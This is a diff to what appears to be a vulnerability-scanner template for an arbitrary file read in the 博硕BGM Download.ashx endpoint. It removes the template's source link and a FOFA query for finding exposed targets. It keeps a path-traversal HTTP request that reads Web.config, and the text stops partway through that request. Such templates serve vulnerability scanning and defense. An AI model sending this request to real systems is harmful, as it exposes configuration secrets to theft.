@@ -3,12 +3,8 @@ info:
   name: 博硕BGM Download.ashx 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzmsnimgnv4o495e'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gzmsnimgnv4o495e
-    fofa: body="Libs/Platform.lib"
 http:
 - raw:
   - 'GET /WebUpload/Download.ashx?fname=&path=/../Web.config HTTP/1.1
